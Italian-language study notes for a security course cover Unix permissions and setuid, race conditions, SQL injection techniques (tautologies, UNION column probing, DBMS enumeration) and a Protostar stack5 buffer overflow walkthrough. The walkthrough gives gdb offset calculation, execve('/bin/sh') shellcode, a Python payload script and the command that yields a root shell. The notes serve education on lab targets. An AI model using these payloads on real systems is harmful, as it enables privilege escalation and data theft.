# Contenuti 

Contenuto per l'esame
- Protostar: 4,5,6 (guardare a 1 $\rightarrow$ 6, prime 4 dal sito)
- Pentester: SQL 1,2,3,8; 4,5,6,7,9 non le chiede per permessi elevati
- XSS: 1 
- Code/Command injection: Guardarle tutte (sono facili)
- File include: 1,2 (e guardare la teoria delle mitigazioni)

Extra: 
- XSS: 1,2,3
- Code injections: 1,2,3,4
- SQL injections: 1,2,3,8


Errori tipici che verranno considerati:
1. Mancata sanitizzazione input 
2. Eccesiva verbosità output
3. Eccessiva esposizione di asset 
4. Esecuzione con privilegi eccessivamente e inutilmente elevati 
5. Corse critiche



### Permessi sui file
I permessi di accesso al file sono 3 terne di azioni:
- Prima terna: Creatore del file 
- Seconda terna: Gruppo di lavoro del creatore del file 
- Terza terna: Tutti gli altri utenti 

Permessi tipici 

```bash
-rwxr-wx-r-x 2 root root ... zsh
-rw-r--r--   1 root root ... passwd 
```

Rappresentazione ottale:
- `R` $\rightarrow$ 4
- `W` $\rightarrow$ 2 
- `X` $\rightarrow$ 1 
rwxrwxr-w $\rightarrow$ 4+2+1, 4+2+1, 4+1 $\rightarrow$ 0775 (ottale)

Rappresentazione simbolica:
- `R` $\rightarrow$ r
- `W` $\rightarrow$ w
- `X` $\rightarrow$ x
- Creatore $\rightarrow$ `u`; Gruppo $\rightarrow$ `g`; Altri $\rightarrow$ `o`
rwxrwxr-w $\rightarrow$ ug+rwx, o+rx (simbolica)

**Bit di permessi `SETUID, SETGID`**

- SETUID: 4 | s (ottale, simbolica)
- SETGID: 2 | s (ottale, simbolica)


Un processo normale in esecuzione assume le credenziali dell'utente (userid e groupid) che lo ha lanciato.  
Se il bit SETUID o il bit SETGID è attivo allora il processo assume le credenziali del creatore del file (userid o gruopid primario) $\rightarrow$ In questo modo diventa possibile cambiare la persona 'effettiva' che esegue il file.  


Il descrittore di un processo memorizza una prima coppia di credienziali, userID e groupID reali, che sono sempre gli ID di chi ha lanciato il processo.  

Il descrittore di un processo memorizza una _seconda_ coppia di credenziali: **user ID e group ID effettivi**.  
Se il bit SETUID è attivo $\rightarrow$ userID effetivo diventa userID del creatore del file. Stessa cosa per SETGID.  


**Algoritmo di controllo dei permessi**:  
Le credenziali _effettive_ del processo sono messe a confronto con i permessi di ogni elemento del percorso di un file, se le credenziali sono sufficineti per ogni elemento del percorso allora viene accordato il permesso di accesso, altrimenti si nega il permesso.  


**Abbassamento e ripristino dei privilegi**:  
Nei SO moderni si usa una terza coppia di credenziali: **userID e groupID salvato**  
Quando un processo parte, le credenziali salvate sono una copia delle credenziali "effettive".  
- Se l'applicazione non svolge operazioni critiche abbassa i propri privilegi a quelli dell'utente che ha eseguito il comdado $\rightarrow$ _priviledge drop_ 
- Quando l'applicazione svolge operazioni critiche, ripristina i privilegi ottenuti tramite l'elevazione automatica $\rightarrow$ _priviledge restore_
- È possibile ripristinare i privilegi a quelli effettivi andando a pescare il valore dell'ID salvato.  


```bash
# chiamata di sistema che ritorna l'ID reale del processo invocante
getuid() 

# chiamata di sistema che ritorna l'ID effettivo 
geteuid()

# permette il cambio degli ID utente di un processo al valore uid
setuid(uid) # userid effettivo

# abbassamento permanente vs temporaneo:
setuid(getuid());
seteuid(getuid());
```



# Corse Critiche

La sincronizzazione di un processo o thread è l'atto di un processo o thread di bloccare la propria esecuzione nell'attesa di un evento; non appena l'evento si verifica il processo o thread riprende la prpopria esecuzione.  

Sincronizzazione sul cambio di stato: la chiamata di sistema `wait()` blocca il processo invocante fino a quando uno dei suoi figli non cambia stato (es: processo figlio esce normalmente o con errore, processo figlio stoppato o ripristinato da un segnale).    

L'ordine di schedulazione di processi e thread impatta _pesantemente_ sul risultato delle operazioni su un asset condiviso (come una variabile).
Quando il risultato finale di una elaborazione su un asset condiviso *dipende* dall'ordine di esecuzione delle istruzioni che la modificano si è in presenza di una **Corsa Critica (race condition)**.  

Siano dati $n$ task eseguiti concorrentemente e cooperanti tramite dati condivisi, diremo che ciascun $T_j$ ha una porzione di codice che accede ai dati condivisi, tale porzione prende il nome di **Sezione Critica**, tale sezione critica deve essere eseguita al _massimo_ da al più un processo/thread alla volta.  

Approcci al problema:
- Accesso in mutua esclusione: si bloccano gli accessi alla variabile condivisa se questa è già in uso
- Esecuzione atomica: si fa in moodo che ogni tentativo di modifica alla variabile condiisa sia eseguito integramente oppure per nulla.  


Nei SO moderni le sezioni dii ingresso e di uscita da una zona critica sono implementate tramite il modello di **`lock`**.  

- `spinlock` $\rightarrow$ implementazione ad attesa attiva, un ciclo while eseguo fino a quando non se ne vanifica la condizione, la CPU continua a ciclare sul while bloccando l'accesso  
    Da usare per attesa brevi, nell'ordine dei ns, diventa disastroso per attese lunghe in quanto il ciclo while brucia il processore  e impedisce ad altri processi di avanzare aumentando la latenza.  

- `attesa passiva` $\rightarrow$ l'attesa nel `wait()` è di tipo passivo. il processo viene messo in attesa (sleep) che si verifichi l'evento che consente l'accesso alla sezione critica, quando si verifica il processo è risvegliato ed inserito in coda.   
    Ideale per attese lunghe, dai ms in su, in quanto si blocca un processo che altrimenti impallerebbe la macchina. Diventa disastroso per attese brevi in quanto la sospensione ed il ripristino del processo introducono un ritardo inaccetabile.   



## SQL Injections:  

Si ricorda lo schema di attacco generale per inizioni di codice  

```
INPUT = INPUT LEGITTIMO +
    + CARATTERE SEPARATORE 
    + STATEMENT SQL ARBITRARIO 
    + CARATTERE CHIUSURA
```

Esistono diversi modi di agganciare uno statement SQL ad un altro: 
- Query concatenata con `;`
- Operatore logico `OR` o `AND`
- Clausola `UNION`

**Tautologie:**  
È possibile utilizzare l'operatore `OR` come separatore di comandi per creare tautologie, ovvero un espressione sempre vera, l'iniezione di una tautologia rende una query SQL sempre vera.  

es: `root' or 1=1 $23`

La tautologia su una clausola `WHERE` mi permette di stampare ogni elemento della tabella.  

**Query UNION:**  
È possibile utilizzare l'operatore `UNION` come separatore dei comandi, tale operatore unisce l'output di più query SQL omogenee.  
Query Omogenee $\rightarrow$ devono avere lo stesso numero di colonne e devono avere dati compatibili sulle stesse colonne.  

Lo statement iniettato dopo una `UNION` è solitamente arbitrario, in questo modo si possono interrogare tabelle arbitrarie, si possono anche eseguire funzioni SQL di sistema (per enumerare il DBMS).  

Un punto importante e non banale consiste nell'individuare il numero di colonne usate dalla query originale $\rightarrow$ per avere query omogenee!  
Si possono usare due tecniche, che sfruttano le clausole:
1. ORDER BY  
    Tale clausola permette di ordinare il risultato di una query in base a una o più colonne, si possono specificare le colonne per nome o per indice (numerico).  
    Se l'indice usato corrisponde a una colonna esistente allora viene effettuato l'ordinametno, altirmenti il DBMS emette un errore.  

    <br>

    L'attaccante inietta ina clausola ORDER BY con indici crescenti e se per l'indice N+1 si verifica un errore allora si deduce che la query originale recupera N colonne  
    Es:  `name=root' ORDER BY 6 %23` è genera un errore, allora avendo prima provato con 1,2,3,4,5 sappiamo che N-1 ossia 6-1 = _5_ sono il numero delle colonne.   

2. SELECT $\rightarrow$ per inserire uno statement con colonne crescenti   
    Un attaccante può iniettare tramite `UNION` uno statement `SELECT` che recupera un numero di colonne crescenti.  
    Nella query si usa il valore `NULL` in quanto compatibile con tutti gli altri tipi di dato SQL, e se il numero di colonne usato nella query iniettata è diverso da quello usato nella query originale il DBMS emette un errore.

    ```
    INPUT = root' +
        + UNION
        + SELECT NULL
        + %23

    si continua a provare incrementando il numero di NULL nella select fino a quando la query non genera un errore
    ```

    Una volta determinate il numero di colonne esatto basta capire quali colonne sono riflesse nell'output, per fare ciò basta iniettare una `SELECT` con valori costanti e diversi per individuare quali vengono riflessi nell'output:

    ```
    INPUT = root' +
        + UNION
        + SELECT 1,2,3,4,5
        + %23
    ```

    Nell'esempio sql_injections1 si nota che vengono riflesse solo le prime 3 colonne!  

<br>

A questo punto si è pronti ad eseguire statement SQL arbitrari! Basta inserire nelle colonne riflesse invocazioin a funzioni di sistema o colonne di tabelle (sistema o utente).  

Gli obiettivi ora diventano: 
1. enumerazione della struttura del DBMS
2. esfiltrazioni dati da tabelle interessanti 

Comandi utili per enumerare il DBMS:
- `version()` $\rightarrow$ restituisce la versione attuale del DBMS
- `database()` $\rightarrow$ restituisce il database attuale  
- `current_user()` $\rightarrow$ utente attualmente connesso al DBMS
- `information_schema()` $\rightarrow$ contiene lo schema di tutti i DB serviti dal server MySQL (strutture delle tabelle, strutture delle colonne, ...)  
  


![sql injection 1](../../images/sql_inj1.png)



<br><br>

## Buffer Oveflow:  

Per poter capire l'attacco risulta necessario studiare il sistema, in particolare capire come è organizzato il layout di memoria di un processo e come funziona gets().  
Si apre il manuale di gets() e si legge che tale funzione non effettua controlli di buffer overrun, quindi la funzione gets() permette input più grandi di 64 byte.  

**Layout di memoria di un programma:**  
Quando un programma viene eseguito (./file1), il sistema operativo:
1. carica ll'eseguibile compilato in memoria per eseguirlo (istruzioni binarie del file ELF)
2. crea un processo con uno spazio di indirizzamento _virtuale_ separato dagli altri processi
3. All'interno di tale spazio, assegna aree (segmenti) con ruoli specifici:
    - codice del programma 
    - variabili statiche 
    - heap $\rightarrow$ variabili dinamiche, usata quando programma chiede memoria a runtime
    - stack LIFO (per le funzioni)
    - un area riservata al Kernel  

![program memory layour](../../images/memory_layout_program.png)


La variabile `buffer[]` è piazzata sullo stack (l'allocatore di memoria GNU/Linux piazza allocazioni dinamiche piccole <128KB sul heap e piazza quella grandi >= 128KB in aree anonime mappate in memoria).  

Lo stack è organizzato per record di attivazione (frame) e cresce verso gli inidrizzi bassi.  
Gli stack frame sono **navigabili** tramite il registro `EBP` (Extended Base Pointer).  
_Nota:_ Ogni volta che si chiama una funzione in C viene creato un record di attivazioe chiamato `stack frame`, che contiene: 
- param b
- param a 
- return address 
- old EBP
- local variables  

Il registro EBP viene usato come puntatore fisso per accedere alle variabili:
- parametri: indirizzi positivi (EBP + offset)
- variabili locali: indirizzi negativi (EBP - offset) 

![stack of main function](../../images/memory_mainWbuffer_layout.png)  


Il nostro `buffer[]` si trova prima del return address del main() in quanto buffer è una variabile locale alla funzione main e si trovano nello stesso frame dello stack, se lo riempiamo oltre la sua capacità i dati scendono nella memoria contigua sovrascrivendo: altre variabili locali, saved EBP e _l'indirizzo di ritorno_. 

L'attacco quindi consta dei seguenti step:
1. Eseguire il programma vulnerabile
2. Quando viene chiesto l'input per il buffer inseriamo l'input malevolo:
    - primo pezzo: shell code $\rightarrow$ codice macchina che apre una shell
    - secondo pezzo: padding $\rightarrow$ byte inutili per riempire fino al punto in cui si trova il return address, la dimensione del padding è da _calcolare_!  
3. Si esegue l'input che manda in overflow il buffer e sovrascrive le zone oltre il buffer compreso il return address che ora contiene l'indirizzo del buffer!
4. Quando la funzione fa `ret` invece di tornare al chiamante salta all'indirizzo del buffer ed esegue lo shell code che abbiamo inserito
5. Lo shell code apre una shell `/bin/sh` con i privilegi del file vulnerabile, se il file aveva setuid root allora si apre una shell con pieni privilegi sul sistema.  


**Calcolo dello spazio tra buffer e return address:**  
Nel nostro caso il il calcolo si fa tenendo conto che la cella con l'indirizzo di ritorno si trova a `EBP+4` e l'indirizzo di buffer è passato a `gets()`.  
Si esegue il programma ./stack5 sotto debugger, si calcolano i due indirizzi richiesti e si effettua la sottrazione 

$$
\text{(EBP+4) - }\&\text{buffer}
$$

Per fare questo calcolo usiamo il debugger `gdb` e seguiamo i prossimi step:
```bash
gdb ./stack5
start # creerà un breakpoint 1 temporale

p $ebp+4 # per ottenere l'indirizzo di ritorno di main()
# $1 = (void *) 0xbffffcac

# disassembliamo il main per individuare la chiamata a gets()
disassemble main 
# ...
# 0x080483cd <main+9>:	lea    0x10(%esp),%eax
# 0x080483d1 <main+13>:	mov    %eax,(%esp)
# 0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
# ...

# - notiamo che l'indirizzo di buffer viene caricato in %eax e inseriamo un breakpoint 
# all'indirizzo in cui viene chiamata gets(), successivamente dumpiamo i registri per
# vedere il valore di %eax che contiene l'indirizzo del buffer

b * 0x80483d4
c
# arriviamo al breakpoint
info registers 
# eax            0xbffffc60	-1073742752
# ecx            0x971dd9bb	-1759651397

# prendiamo l'indirizzo di %eax e lo sottraiamo a quello di ritorno del main per ottenere 
# il numero di byte necessari. 

0xbffffcac - 0xbffffc60 = 76 
```

A questo punto dobbiamo scrivere lo shellcode, quello che vogliamo eseguire in ambiente linux è:  

```bash
execve("/bin/sh");
exit(0);
```
I parametri di `execve()` sono:  
1. `filename` $\rightarrow$ percorso del programma da eseguire (/bin/sh)
2. `argv[]` $\rightarrow$ array di argomenti del programma (nel nostro caso NULL)
3. `envp[]` $\rightarrow$ array delle variabili di ambiente (NULL)

Nelle chiamate di sistema Linux _i parametri si passano nei registri_:
- `eax` $\rightarrow$ numero identificativo della chiamata di sistema (execve: 11)
- `eNx` $\rightarrow$ argomento $n$-esimo 




```bash
xor %eax, %eax        # azzera EAX (preparazione)
push %eax             # push di un NULL sullo stack (terminatore stringa)
push $0x68732f2f      # "//sh"
push $0x6e69622f      # "/bin"
mov %esp, %ebx        # EBX = puntatore a "/bin//sh"
mov %eax, %ecx        # argv = NULL
mov %eax, %edx        # envp = NULL
mov $0xb, %al         # eax = 11 -> syscall execve
int $0x80             # interrupt per fare la syscall

xor %eax, %eax        # prepara exit(0)
inc %eax
int $0x80
```

Per ottenere la sequenza di byte eseguibii dobbiamo scrivere il file assembly e compilarlo senza generare l'eseguibile finale, in questo modo otteniamo gli **opcode** eseguibili.  
Copiamo tali opcode e li inseriamo in un file python che manderà l'input malevolo.


```python
length = 76 #lunghezza a cui si trova il return address del main 


# indirizzo di ritorno del buffer, è la parte che dobbiamo modificare dello script (otteniamo l'indirizzo del buffer con il debugger)
ret = '\x00\x00\x00\x00' 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80"
padding = 'a' * (length - len(shellcode))

payload = shellcode + padding + ret
print payload
```

A questo punto una volta calcolato l'indirizzo del buffer lo trasformiamo in little endian e lo inseriamo nello script (`ret = '\x90\xfc\xff\xbf'`).   

Ora eseguiamo lo script e mettiamo l'output in `/tmp/payload`  
A qeusto punto siamo pronti a sfruttare l'exploit, mandiamo l'input malevolo e noteremo che verrà aperta una nuova shell, facendo `id` noteremo che avremo euid=0 (root) in quanto la shell avrà ereditato i permessi del file vulenerabile.  

```bash
(cat /tmp/payload; cat) | /opt/protostar/bin/stack5
```

Risulta necessario usare due volte `cat` in quanto serve uno STDIN per la shell che creeremo (altrimenti al primo input riceverà un EOF).  
- il primo cat inietta l'input malevolo ed attiva la shell 
- il secondo accetta input da STDIN e lo inoltra alla shell 

